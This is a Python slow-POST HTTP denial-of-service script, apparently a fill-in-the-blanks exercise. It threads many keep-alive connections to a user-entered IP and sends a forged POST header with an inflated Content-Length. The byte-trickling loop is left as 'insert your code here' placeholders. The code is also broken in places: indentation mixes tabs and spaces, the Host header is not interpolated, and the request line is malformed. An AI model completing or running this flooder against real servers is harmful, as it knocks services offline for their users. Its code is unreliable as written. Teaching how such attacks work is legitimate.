import random
import socket
import string
import sys
import threading
import time


thread_num = 0
thread_num_mutex = threading.Lock()

stop = False


def print_status():
    global thread_num
    thread_num_mutex.acquire(True)
    thread_num += 1
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] Gas leak... let's see how long you can hold your breath")
    sys.stdout.flush()
    thread_num_mutex.release()


def attack(ip, port):
    print_status()
    global stop
    while not stop:
    	# create socket
        http_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
        	# open connection
            http_conn.connect((ip, port))
            
            # forge http header
            # note that the content length is more than what we are actually sending to the server 
            data = (f"POST /HTTP/1.1\r\n" \
                    "Host: {str(ip)}\r\n" \
                    "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\r\n" \
                    "Connection: keep-alive\r\n" \
                    "Keep-Alive: 900\r\n" \
                    "Content-Length: 10000\r\n" \
                    "Content-Type: application/x-www-form-urlencoded\r\n\r\n").encode()
            
            # send http header        
            http_conn.send(data)
            
            # loop to send the rest of the http request 
            # each payload segment must be sent waiting some period of time
            for i in range(9999):
                if stop:
                    break
                
                # send a random char
                # insert your code here
                
                
                
                # wait some time to send the next piece of payload
                # (hint: use sleep())
                # insert your code here
                
                

            http_conn.close()
        except KeyboardInterrupt:
                stop = True
                print("\nExiting...")
                sys.exit(0)


def main():
    ip = input("Enter target IP: ")
    num_requests = input("Enter threads (you can leave this blank): ")
    try:
        ip = socket.gethostbyname(ip)
        num_requests = 100 if num_requests == '' else int(num_requests)
    except:
        sys.exit(1)
    all_threads = []
    for i in range(num_requests):
        t = threading.Thread(target=attack, args=(ip, 80))
        t.deamon=True
        t.start()
        all_threads.append(t)
        time.sleep(0.01)
    for t in all_threads:
    	try:
        	t.join()
        except KeyboardInterrupt:
        	print("Attack ended")
        
        	sys.exit(0)


if __name__ == "__main__":
    main()
